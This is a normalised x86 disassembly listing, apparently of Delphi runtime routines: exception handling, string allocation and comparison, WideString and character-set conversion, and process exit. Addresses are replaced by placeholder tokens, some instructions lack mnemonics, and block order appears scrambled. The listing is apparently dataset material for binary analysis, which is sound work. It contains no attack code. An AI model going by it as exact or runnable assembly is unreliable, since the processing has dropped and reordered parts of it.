mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405d7c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403684
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c3c
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039e4
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036cc
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403a1c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403fd4
sub_403a44
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405d7c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403290
call sub_40362c
sub_403a98
call sub_405d7c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403290
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036f4
jmp edx
sub_403ae0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c40
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cae
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403cc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d0e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405b10
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d8c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405b10
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403db4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403dd8
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e34
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e64
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ef0
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403dd8
call sub_403e64
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c68
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c40
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4055dc
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e34
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fe0
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_404004
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404034
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4040a4
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404078
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_4040a4
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_4040d0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4040a4
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403fe0
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_404100
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404120
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_40413c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403fe0
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40462c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404100
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404100
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40462c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4040d0
jmp r-xdata
sub_4041d8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040d0
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404208
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40413c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404250
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4040d0
not ecx
sub_40427c
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_4042a8
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404034
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40462c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40462c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_4042ec
test edx edx
je r-xdata
mov edx ecx
jmp sub_404034
test ecx ecx
je sub_404034
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4042a8
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4040a4
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404034
pop edx
pop eax
jmp sub_4042a8
call sub_404034
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404360
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4040a4
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40462c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404034
dec [ edx - 0x8 ]
sub_4043ec
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4044ac
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4040a4
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_404500
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403fe0
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_4040d0
jmp r-xdata
pop ebx
retn 0x4
sub_404540
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4044ac#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40462c
mov edi ecx
sub_404588
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40462c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045e4
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40462c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403fe0
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4040a4
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046d8
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046fc
test edx edx
je sub_4046c0
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4046c0
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_404720
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4046c0
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404908
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404120
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404120
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404908
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4047ac
jmp r-xdata
sub_4047ac
test ecx ecx
je sub_4046c0
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4047d0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4047ac
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404838
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4048bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40482c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4047ac
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404908
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4046b0
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404698
mov ebx eax
mov eax [ edi ]
call sub_40482c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_40494c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_40497c
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_40497c
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_40497c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40494c
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404a1c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a68
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a68
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404004
jmp r-xdata
call sub_403fe0
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046d8
jmp r-xdata
call sub_4046c0
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a50
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a68
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a1c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40564c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404fa0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404b78
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
